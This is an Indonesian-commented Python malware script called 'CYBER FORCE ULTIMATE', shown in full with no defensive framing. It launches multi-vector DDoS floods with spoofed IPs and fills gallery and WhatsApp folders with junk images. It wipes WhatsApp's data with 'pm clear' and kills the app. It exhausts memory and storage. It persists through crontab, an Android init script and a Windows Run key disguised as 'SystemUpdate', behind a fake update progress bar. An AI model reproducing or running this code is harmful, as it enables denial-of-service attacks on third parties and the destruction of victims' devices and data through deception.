#!/usr/bin/env python3
# CYBER FORCE - ULTIMATE ALL-IN-ONE v7.0
# Gabungan: DDoS + Spam Galeri + Crash WhatsApp + Hang System + Destroy Storage + Stealth

import os
import sys
import time
import random
import threading
import requests
import shutil
import subprocess
import socket
import struct
from urllib.parse import urlparse
from datetime import datetime
from pathlib import Path
from fake_useragent import UserAgent

# ============================================
# KONFIGURASI UTAMA
# ============================================
CONFIG = {
    "mode": "silent",                     # silent / normal
    "ddos_target": "http://target.com",
    "ddos_ip": "1.2.3.4",
    "ddos_port": 80,
    "ddos_threads": 200,
    "spam_urls": [
        "https://iili.io/ClfkhsS.jpg",
        "https://iili.io/Clfkwq7.jpg",
        "https://iili.io/ClfOjTl.jpg"
    ],
    "spam_threads": 150,
    "crash_whatsapp": True,
    "hang_system": True,
    "destroy_storage": True,
    "auto_start": True,
    "hide_output": True,
}

# ============================================
# FAKE UPDATE (UNTUK STEALTH)
# ============================================
def fake_update():
    print("Installing system updates...")
    for i in range(101):
        bar = "=" * (i // 2) + " " * (50 - i // 2)
        print(f"\r[{bar}] {i}%", end="")
        time.sleep(random.uniform(0.02, 0.05))
    print("\nUpdate completed. Optimizing...")

# ============================================
# DDoS MODULE (Gabungan Semua Vektor)
# ============================================
ua = UserAgent()

def ddos_http():
    session = requests.Session()
    parsed = urlparse(CONFIG["ddos_target"])
    host = parsed.netloc
    while True:
        try:
            path = f"/{random.randint(1,999999)}?{random.randint(1,999999)}={random.randint(1,999999)}"
            url = f"{parsed.scheme}://{host}{path}"
            headers = {
                "User-Agent": ua.random,
                "Accept": "*/*",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            if random.choice([True, False]):
                session.post(url, headers=headers, data={"key": str(random.random())}, timeout=2)
            else:
                session.get(url, headers=headers, timeout=2)
            print("[🔥 DDoS HTTP]") if not CONFIG["hide_output"] else None
        except:
            pass
        time.sleep(random.uniform(0.01, 0.03))

def ddos_syn():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except:
        return
    while True:
        try:
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            src_port = random.randint(1024, 65535)
            seq = random.randint(1, 4294967295)
            # IP header
            ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 40, random.randint(1,65535), 0, 255, socket.IPPROTO_TCP, 0,
                                    socket.inet_aton(src_ip), socket.inet_aton(CONFIG["ddos_ip"]))
            tcp_header = struct.pack('!HHLLBBHHH', src_port, CONFIG["ddos_port"], seq, 0, 0x50, 0x02, random.randint(1024,65535), 0, 0)
            packet = ip_header + tcp_header
            sock.sendto(packet, (CONFIG["ddos_ip"], 0))
            print("[🔥 DDoS SYN]") if not CONFIG["hide_output"] else None
        except:
            pass
        time.sleep(0.001)

def ddos_udp():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            data = random._urandom(1024)
            sock.sendto(data, (CONFIG["ddos_ip"], CONFIG["ddos_port"]))
            print("[🔥 DDoS UDP]") if not CONFIG["hide_output"] else None
        except:
            pass
        time.sleep(0.001)

def ddos_icmp():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except:
        return
    while True:
        try:
            packet = struct.pack('!BBHHH', 8, 0, 0, random.randint(1,65535), random.randint(1,65535)) + random._urandom(56)
            sock.sendto(packet, (CONFIG["ddos_ip"], 0))
            print("[🔥 DDoS ICMP]") if not CONFIG["hide_output"] else None
        except:
            pass
        time.sleep(0.001)

def start_ddos():
    print("[*] Starting DDoS attack...") if not CONFIG["hide_output"] else None
    for _ in range(CONFIG["ddos_threads"] // 4):
        threading.Thread(target=ddos_http, daemon=True).start()
        threading.Thread(target=ddos_syn, daemon=True).start()
        threading.Thread(target=ddos_udp, daemon=True).start()
        threading.Thread(target=ddos_icmp, daemon=True).start()

# ============================================
# SPAM GALERI MODULE (Semua Folder)
# ============================================
def get_all_paths():
    if sys.platform == "win32":
        return [
            os.path.expanduser("~\\Pictures\\Spam"),
            os.path.expanduser("~\\Downloads\\Spam"),
            os.path.expanduser("~\\Videos\\Spam"),
            os.path.expanduser("~\\Music\\Spam"),
            os.path.expanduser("~\\Documents\\Spam"),
            os.path.expanduser("~\\Desktop\\Spam"),
            os.path.expanduser("~\\AppData\\Local\\Temp\\Spam"),
            "C:\\Windows\\Temp\\Spam",
        ]
    else:
        return [
            "/sdcard/DCIM/Spam",
            "/sdcard/Download/Spam",
            "/sdcard/Pictures/Spam",
            "/sdcard/Movies/Spam",
            "/sdcard/Music/Spam",
            "/sdcard/WhatsApp/Media/WhatsApp Images/Spam",
            "/sdcard/WhatsApp/Media/WhatsApp Video/Spam",
            "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Spam",
            "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Spam",
            "/sdcard/Telegram/Telegram Images/Spam",
            "/sdcard/Telegram/Telegram Video/Spam",
            "/sdcard/Instagram/Spam",
            "/sdcard/Facebook/Spam",
            "/sdcard/Android/data/com.whatsapp/files/Media/Spam",
            "/sdcard/Download/WhatsApp/Spam",
            "/data/local/tmp/.system",
        ]

def silent_download(url):
    for _ in range(3):
        try:
            headers = {"User-Agent": ua.random}
            r = requests.get(url, headers=headers, timeout=5)
            if r.status_code == 200:
                return r.content
        except:
            pass
    return None

def spam_all_folders():
    paths = get_all_paths()
    for p in paths:
        try:
            Path(p).mkdir(parents=True, exist_ok=True)
            with open(os.path.join(p, ".nomedia"), 'w') as f:
                f.write("")
        except:
            pass
    while True:
        try:
            url = random.choice(CONFIG["spam_urls"])
            content = silent_download(url)
            if content:
                ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
                fname = f"img_{ts}_{random.randint(1000,9999)}.jpg"
                for p in paths:
                    try:
                        with open(os.path.join(p, fname), 'wb') as f:
                            f.write(content)
                    except:
                        pass
                print("[📸 Spam]") if not CONFIG["hide_output"] else None
        except:
            pass
        time.sleep(0.001)

# ============================================
# CRASH WHATSAPP
# ============================================
def crash_whatsapp():
    while CONFIG["crash_whatsapp"]:
        try:
            if sys.platform != "win32":
                os.system("am force-stop com.whatsapp > /dev/null 2>&1")
                os.system("pm clear com.whatsapp > /dev/null 2>&1")
                # Spam folder WhatsApp
                wpaths = [
                    "/sdcard/WhatsApp/Media/WhatsApp Images/.cache",
                    "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/.temp",
                ]
                for p in wpaths:
                    try:
                        Path(p).mkdir(exist_ok=True)
                        for _ in range(10):
                            with open(os.path.join(p, f"crash_{int(time.time())}.bin"), 'wb') as f:
                                f.write(b'\x00' * (20 * 1024 * 1024))
                    except:
                        pass
            else:
                os.system("taskkill /IM WhatsApp.exe /F > nul 2>&1")
                os.system("taskkill /IM WhatsAppDesktop.exe /F > nul 2>&1")
            time.sleep(30)
        except:
            pass

# ============================================
# HANG SYSTEM
# ============================================
def hang_system():
    memory_hog = []
    processes = []
    while CONFIG["hang_system"]:
        try:
            for _ in range(10):
                memory_hog.append(b'\x00' * (5 * 1024 * 1024))
            for _ in range(5):
                if sys.platform != "win32":
                    p = subprocess.Popen(["sleep", "9999"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                else:
                    p = subprocess.Popen(["ping", "127.0.0.1", "-t"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                processes.append(p)
            time.sleep(0.2)
        except:
            pass

# ============================================
# DESTROY STORAGE
# ============================================
def destroy_storage():
    while CONFIG["destroy_storage"]:
        try:
            if sys.platform == "win32":
                temp = os.environ.get('TEMP', 'C:\\Windows\\Temp')
                for _ in range(10):
                    with open(os.path.join(temp, f"tmp_{int(time.time())}.bin"), 'wb') as f:
                        f.write(b'\x00' * (50 * 1024 * 1024))
            else:
                sys_paths = ["/data/local/tmp/.cache", "/cache/.system", "/sdcard/.android/cache"]
                for p in sys_paths:
                    try:
                        Path(p).mkdir(exist_ok=True)
                        for _ in range(5):
                            with open(os.path.join(p, f"sys_{int(time.time())}.bin"), 'wb') as f:
                                f.write(b'\x00' * (30 * 1024 * 1024))
                    except:
                        pass
            time.sleep(3)
        except:
            pass

# ============================================
# AUTO-START & STEALTH
# ============================================
def setup_autostart():
    if CONFIG["auto_start"]:
        try:
            if sys.platform != "win32":
                cron = f"* * * * * python3 {__file__} --silent > /dev/null 2>&1"
                with open("/data/data/com.termux/files/usr/etc/crontab", "a") as f:
                    f.write(cron + "\n")
                init = f"""#!/system/bin/sh
while true; do python3 {__file__} --silent > /dev/null 2>&1 & sleep 30; done
"""
                with open("/data/local/tmp/.system_init.sh", "w") as f:
                    f.write(init)
                os.chmod("/data/local/tmp/.system_init.sh", 0o755)
            else:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(handle, "SystemUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{__file__}" --silent')
                winreg.CloseKey(handle)
        except:
            pass

# ============================================
# MAIN
# ============================================
def main():
    if not CONFIG["hide_output"]:
        print("CYBER FORCE ULTIMATE v7.0 ACTIVE")
    else:
        # fake update
        fake_update()
        time.sleep(5)

    setup_autostart()

    # Start semua thread
    threads = []

    # DDoS
    for _ in range(CONFIG["ddos_threads"]):
        t = threading.Thread(target=start_ddos)
        t.daemon = True
        threads.append(t)
        t.start()

    # Spam
    for _ in range(CONFIG["spam_threads"]):
        t = threading.Thread(target=spam_all_folders)
        t.daemon = True
        threads.append(t)
        t.start()

    # Crash WhatsApp
    t = threading.Thread(target=crash_whatsapp)
    t.daemon = True
    threads.append(t)
    t.start()

    # Hang System
    t = threading.Thread(target=hang_system)
    t.daemon = True
    threads.append(t)
    t.start()

    # Destroy Storage
    t = threading.Thread(target=destroy_storage)
    t.daemon = True
    threads.append(t)
    t.start()

    # Simpan PID
    try:
        with open("/tmp/.ultimate_force.pid", "w") as f:
            f.write(str(os.getpid()))
    except:
        pass

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        sys.exit()

if __name__ == "__main__":
    if "--silent" in sys.argv:
        CONFIG["hide_output"] = True
        CONFIG["mode"] = "silent"
    main()
